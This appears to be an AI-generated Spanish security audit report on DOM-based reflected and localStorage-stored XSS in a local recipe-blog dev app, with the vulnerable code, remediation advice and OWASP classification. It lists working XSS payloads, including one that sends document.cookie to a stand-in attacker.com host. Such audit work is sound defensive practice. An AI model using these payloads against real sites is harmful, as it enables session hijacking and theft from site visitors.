# Informe de Auditoría de Seguridad - Cross-Site Scripting (XSS)

**Fecha:** 2026-04-30  
**Hora:** 15:49:53 UTC  
**Objetivo:** http://web.dev.local:8082  
**Analista:** GitHub Copilot CLI  
**Tipo de análisis:** Detección y explotación de vulnerabilidades XSS  

---

## Resumen Ejecutivo

Se identificaron **2 vulnerabilidades de tipo Cross-Site Scripting (XSS)** en la aplicación web objetivo (Blog de Recetas). Ambas son de tipo **DOM-based XSS**, ya que el procesamiento del input ocurre en el lado del cliente mediante JavaScript sin ningún tipo de sanitización. Adicionalmente, el sistema de comentarios presenta una vulnerabilidad de **Stored DOM XSS** mediante `localStorage`.

---

## Descripción de la Aplicación

La aplicación es un "Blog de Recetas" que incluye:
1. Un **buscador de recetas** con parámetro GET `search`
2. Un **sistema de comentarios** con parámetros GET `name` y `comment`, almacenados en `localStorage`

---

## Vulnerabilidades Encontradas

### Vulnerabilidad 1: DOM-Based XSS en el Buscador (Reflected)

**Severidad:** 🔴 Alta  
**Tipo:** DOM-Based XSS (Reflected)  
**Parámetro afectado:** `search` (GET)  
**URL vulnerable:** `http://web.dev.local:8082/?search=<PAYLOAD>`

#### Descripción técnica

El código JavaScript de la página obtiene el parámetro `search` directamente desde `URLSearchParams` y lo inserta en el DOM mediante `document.write()` **sin ningún tipo de sanitización o codificación**:

```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');

if (searchTerm) {
    document.write('<div class="result" ...>');
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
    // ...
    document.write('</div>');
}
```

El valor de `searchTerm` se concatena directamente en el HTML sin escapar caracteres especiales como `<`, `>`, `"`, `'` o `&`.

#### Payloads de explotación verificados

```
# Payload básico con script tag
http://web.dev.local:8082/?search=<script>alert('XSS')</script>

# Payload con evento onerror (evasión de filtros básicos)
http://web.dev.local:8082/?search=<img src=x onerror=alert('XSS')>

# Payload para robo de cookies
http://web.dev.local:8082/?search=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

# Payload con iframe
http://web.dev.local:8082/?search=<iframe src="javascript:alert('XSS')"></iframe>

# Payload con SVG
http://web.dev.local:8082/?search=<svg onload=alert('XSS')>
```

#### Impacto

- Ejecución arbitraria de JavaScript en el navegador de la víctima
- Robo de cookies de sesión
- Redirección a sitios maliciosos (phishing)
- Defacement visual de la página
- Captura de pulsaciones de teclado (keylogging)
- El ataque se puede distribuir enviando una URL maliciosa a víctimas

---

### Vulnerabilidad 2: DOM-Based Stored XSS en el Sistema de Comentarios

**Severidad:** 🟠 Media-Alta  
**Tipo:** DOM-Based Stored XSS (via localStorage)  
**Parámetros afectados:** `name` y `comment` (GET)  
**URL vulnerable:** `http://web.dev.local:8082/?name=<NOMBRE>&comment=<PAYLOAD>`

#### Descripción técnica

El sistema de comentarios almacena los datos en `localStorage` sin sanitización y los renderiza mediante `document.write()`:

```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');

if (name && comment) {
    let comments = JSON.parse(localStorage.getItem('comments') || '[]');
    comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
    localStorage.setItem('comments', JSON.stringify(comments));
    window.location.href = window.location.pathname;
}

// Al renderizar:
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

#### Payloads de explotación

```
# Stored XSS en el campo comment
http://web.dev.local:8082/?name=Usuario&comment=<script>alert('Stored XSS')</script>

# Stored XSS en el campo name
http://web.dev.local:8082/?name=<img src=x onerror=alert('XSS en nombre')>&comment=Hola
```

#### Impacto

- El payload se persiste en el navegador de quien lo introduce
- Si el navegador es compartido, afecta a todos los usuarios que lo usen
- Permite ataques de tipo "self-XSS" con ingeniería social

---

## Análisis de Causa Raíz

| Problema | Descripción |
|----------|-------------|
| Falta de sanitización de input | Los parámetros GET se usan directamente sin validación |
| Uso inseguro de `document.write()` | Esta función interpreta HTML directamente, facilitando la inyección |
| Ausencia de Content Security Policy (CSP) | No hay cabeceras CSP para mitigar la ejecución de scripts no autorizados |
| Concatenación de strings HTML | Se construye HTML mediante concatenación en lugar de APIs seguras del DOM |

---

## Prueba de Concepto (PoC)

### PoC 1 - Reflected DOM XSS
```
URL: http://web.dev.local:8082/?search=<img+src=x+onerror=alert('XSS_REFLECTED')>

Resultado: Al cargar la URL en un navegador, se ejecuta el código JavaScript
inyectado, mostrando un alert con el texto 'XSS_REFLECTED'.
```

### PoC 2 - Stored DOM XSS
```
Paso 1 - Inyectar payload:
URL: http://web.dev.local:8082/?name=Hacker&comment=<script>alert('XSS_STORED')</script>

Paso 2 - El payload queda almacenado en localStorage del navegador.

Paso 3 - Al visitar http://web.dev.local:8082/ (sin parámetros), se ejecuta
automáticamente el JavaScript inyectado al renderizar los comentarios guardados.
```

---

## Recomendaciones

### 1. Sanitizar el input antes de renderizarlo

Usar una función de escape HTML antes de insertar cualquier dato en el DOM:

```javascript
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// Uso correcto:
document.write('<p>Resultados para: <strong>' + escapeHtml(searchTerm) + '</strong></p>');
```

### 2. Reemplazar `document.write()` por APIs seguras del DOM

```javascript
// En lugar de document.write(), usar:
const p = document.createElement('p');
p.textContent = 'Resultados para: ' + searchTerm; // textContent escapa automáticamente
container.appendChild(p);
```

### 3. Implementar Content Security Policy (CSP)

Añadir la siguiente cabecera HTTP en el servidor:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

### 4. Validar y sanitizar datos en localStorage

Antes de almacenar o recuperar datos de `localStorage`, validar el contenido y usar `textContent` en lugar de `innerHTML` o `document.write()`.

### 5. Usar DOMPurify para sanitización

Para casos complejos, usar la librería [DOMPurify](https://github.com/cure53/DOMPurify):

```javascript
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(searchTerm);
```

---

## Clasificación OWASP

- **OWASP Top 10 2021:** A03:2021 – Injection (incluye XSS)
- **CWE:** CWE-79 – Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
- **CVSS Base Score (estimado):** 6.1 (Medium) para XSS Reflected / 5.4 (Medium) para Stored XSS

---

## Conclusión

La aplicación web presenta vulnerabilidades XSS de tipo DOM-Based tanto reflejadas como almacenadas (via localStorage). La causa raíz es el uso inseguro de `document.write()` con datos no sanitizados provenientes de parámetros URL. Se recomienda aplicar las correcciones descritas con urgencia, especialmente la sanitización de inputs y la eliminación del uso de `document.write()`.

---

*Informe generado automáticamente por análisis de seguridad automatizado.*
